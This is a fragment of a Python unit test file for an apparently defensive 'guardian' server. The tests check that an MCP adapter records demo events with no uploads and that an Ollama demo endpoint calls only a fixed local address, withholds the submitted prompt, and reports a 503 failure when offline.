            outcome=json.loads(rows[1]['result']['content'][0]['text'])
            self.assertEqual(outcome['simulated_upload_count'],0)
            self.assertEqual(outcome['event']['source_adapter'],'codex-mcp')
            self.assertTrue(outcome['event']['is_demo'])

    def test_ollama_fixed_destination_and_failure(self):
        fake = MagicMock()
        fake.open.return_value.__enter__.return_value = io.BytesIO(b'{"response":"fixture summary","eval_count":2}')
        with patch('guardian.server.urllib.request.build_opener', return_value=fake):
            result = self.request('/api/ollama/demo', {'model':'qwen3:8b','prompt':'MUST NOT FORWARD'})
        sent = fake.open.call_args.args[0]
        self.assertEqual(sent.full_url,'http://127.0.0.1:11435/api/generate')
        self.assertNotIn('MUST NOT FORWARD',sent.data.decode())
        self.assertTrue(result['real_inference'])
        self.assertEqual(result['event']['source_adapter'],'ollama-local')
        fake.open.side_effect = OSError('offline')
        with patch('guardian.server.urllib.request.build_opener', return_value=fake):
            with self.assertRaises(urllib.error.HTTPError) as caught:
                self.request('/api/ollama/demo', {'model':'qwen3:8b'})
        self.assertEqual(caught.exception.code,503)
        self.assertEqual(self.engine.events()[0]['enforcement_status'],'inference_failed')


if __name__ == '__main__':
    unittest.main()
